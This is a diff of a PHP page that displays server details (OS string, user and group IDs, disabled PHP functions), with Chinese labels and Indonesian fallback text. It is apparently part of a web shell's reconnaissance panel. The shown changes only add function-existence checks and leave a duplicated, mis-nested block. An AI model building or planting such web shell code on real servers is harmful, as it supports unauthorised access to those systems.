@@ -861,24 +861,49 @@ a {
 <div class="system-info">
     <div class="system-info-left">
         <p>
-            <strong style="color: #00aaff;">系统信息:</strong>
+            <p>
+    <strong style="color: #00aaff;">系统信息:</strong>
+    <span style="color: #ffffff;"><?php
+        echo htmlspecialchars((function() {
+            try {
+                if (function_exists('php_uname')) return php_uname();
+                if ($os = getenv('OS')) return $os;
+                if (defined('PHP_OS')) return PHP_OS;
+                return "Dinonaktifkan";
+            } catch (Throwable $e) {
+                return "Dinonaktifkan";
+            }
+        })());
+    ?></span>
+</p>
+
             <span style="color: #ffffff;"><?php echo htmlspecialchars(php_uname()); ?></span>
         </p>
         <p>
             <strong style="color: #00aaff;">用户:</strong>
-            <span style="color: #ffffff;"><?php echo getmyuid() . " (" . get_current_user() . ")"; ?></span>
+            <span style="color: #ffffff;"><?php
+    if (function_exists('getmyuid') && function_exists('get_current_user')) {
+        echo getmyuid() . " (" . get_current_user() . ")";
+    } else {
+        echo "Dinonaktifkan";
+    }
+?></span>
+
         </p>
-        <p>
-            <strong style="color: #00aaff;">组:</strong>
-            <span style="color: #ffffff;"><?php 
-                if (function_exists('posix_getegid')) {
-                    $qid = posix_getgrgid(posix_getegid());
-                    echo getmygid() . " (" . $qid['name'] . ")";
-                } else {
-                    echo getmygid();
-                }
-            ?></span>
-        </p>
+<p>
+    <strong style="color: #00aaff;">组:</strong>
+    <span style="color: #ffffff;"><?php 
+        if (function_exists('getmygid') && function_exists('posix_getegid') && function_exists('posix_getgrgid')) {
+            $qid = @posix_getgrgid(@posix_getegid());
+            echo getmygid() . " (" . ($qid['name'] ?? '未知') . ")";
+        } elseif (function_exists('getmygid')) {
+            echo getmygid();
+        } else {
+            echo "Dinonaktifkan";
+        }
+    ?></span>
+</p>
+
         <p>
             <strong style="color: #00aaff;">禁用函数:</strong>
             <span style="color: #ff6666;"><?php echo (implode(", ", $nami)=="" ? "NONE :)" : implode(", ", $nami)); ?></span>
